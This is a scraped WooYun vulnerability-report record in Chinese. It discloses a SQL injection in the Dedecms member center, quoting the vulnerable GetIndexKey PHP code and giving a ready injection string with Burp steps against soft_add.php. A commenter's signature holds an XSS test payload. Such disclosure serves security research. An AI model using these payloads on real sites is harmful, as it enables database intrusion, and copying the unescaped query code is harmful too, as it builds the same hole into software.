{"id": 4844, "wybug_id": "wooyun-2014-048892", "wybug_title": "Dedecms 会员中心注入漏洞6", "wybug_corp": "Dedecms", "wybug_author": "Matt", "wybug_date": "2014-01-14 16:56", "wybug_open_date": "2014-04-14 16:57", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-14：\t细节向公众公开  简要描述： Dedecms 会员中心注入漏洞6我真的真的不是来刷洞刷奖金的！ 详细说明：  \n5',1,1,1,@`'`),('-1','7',user() , '3','1389688643', '1389688643', '8'),(1,2,'/include/helpers/archive.helper.phpif ( ! function_exists('GetIndexKey')){    function GetIndexKey($arcrank, $typeid, $sortrank=0, $channelid=1, $senddate=0, $mid=1)    {        global $dsql,$senddate,$typeid2;//typeid2调用外部 结合dede的便利覆盖即可        if(empty($typeid2)) $typeid2 = 0;        if(empty($senddate)) $senddate = time();        if(empty($sortrank)) $sortrank = $senddate;        $iquery = \"          INSERT INTO `#@__arctiny` (`arcrank`,`typeid`,`typeid2`,`channel`,`senddate`, `sortrank`, `mid`)          VALUES ('$arcrank','$typeid','$typeid2' , '$channelid','$senddate', '$sortrank', '$mid') \";\t\t echo    $iquery;        $dsql->ExecuteNoneQuery($iquery);        $aid = $dsql->GetLastID();        return $aid;    }}调用/member/soft_add.phpelse if($dopost=='save'){    $description = '';    include(DEDEMEMBER.'/inc/archives_check.php');    //生成文档ID    $arcID = GetIndexKey($arcrank,$typeid,$sortrank,$channelid,$senddate,$mid);//调用了~    if(empty($arcID))\n   漏洞证明：  调用的地方比较多 我就不一一写出了测试方法 打开http://127.0.0.1/dede/member/soft_add.php添加软件然后打开BURP抓包讲picnum改成typeid2然后参数写5',1,1,1,@`'`),('-1','7',user() , '3','1389688643', '1389688643', '8'),(1,2,'就能看到注入结果了\n\n\n\n\n\n   修复方案：  过滤啊！   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-01-14 22:24 厂商回复： 已修复，感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-14 16:57 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  我去 又来一个    \n     2014-01-14 17:00 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  那你就是来刷屏的    \n     2014-01-14 17:07 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  @疯狗 嘿嘿 一会在看看    \n     2014-01-14 17:13 |    \t\tJ′aron \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 问题真实存在但是影响不大.)\t\t \n  施主，你这是连载的节奏么？    \n     2014-01-14 17:13 |    \t\t绝情刀 \t\t\t( 普通白帽子  |\t\t\t        Rank:132 漏洞数:24        | .)\t\t \n  @Matt 偶像，你好    \n     2014-01-14 17:14 |    \t\t计算姬 \t\t\t( 普通白帽子  |\t\t\t        Rank:398 漏洞数:90        | 看我看我看我啊)\t\t \n  坐等7，求别乱入    \n     2014-01-14 17:35 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  凹槽，太强悍了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}